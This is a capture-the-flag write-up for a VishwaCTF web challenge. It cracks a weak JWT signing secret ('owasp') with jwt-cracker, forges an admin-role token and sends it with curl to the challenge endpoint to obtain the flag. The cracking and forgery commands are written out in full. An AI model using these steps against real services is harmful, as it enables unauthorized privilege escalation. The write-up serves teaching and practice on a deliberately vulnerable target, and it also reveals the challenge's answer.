

# Challenge description

Yet another API for ‘user’ signup and login. You know the drill, GO! https://k33p-y0ur-53cr3t5.vishwactf.com/

-----------------------------------------------------------

In this challenge we have two endpoints. one of which is used by an admin . the goal is to become admin thru the jwt cookie we get with the signup endpoint

![image](https://user-images.githubusercontent.com/58823465/159310066-28918484-ca32-41cc-b0a7-8cb28003f53a.png)


Using jwt-cracker we can crack the token

``` 
jwt-cracker abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTY0Nzc4ODI2Mn0.Py60wfbnD7sDP6ygXlV7q5TOHIDzGmzOxWRHdWYVeCc
``` 

![image](https://user-images.githubusercontent.com/58823465/159310168-387fb591-8a22-4285-bb06-3c2b53c77202.png)


this took a while but we found eventually the key used : ` "owasp" ` 

Now we just need to craft a new cookie and send up and access the /api/login/user endpoint

```
curl -X POST https://k33p-y0ur-53cr3t5.vishwactf.com/api/login/user -H "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NDc3ODgyNjJ9.uu3NUzQOkwzACFnCmHVnqljT7_Xv_ko2ND8x0pbQPqA"
```

and we get the flag !

![image](https://user-images.githubusercontent.com/58823465/159310616-f5c9f748-0628-479f-9a6d-6aee642d74ec.png)


``` Flag : vishwaCTF{w3@k_$ecr3t$} ```
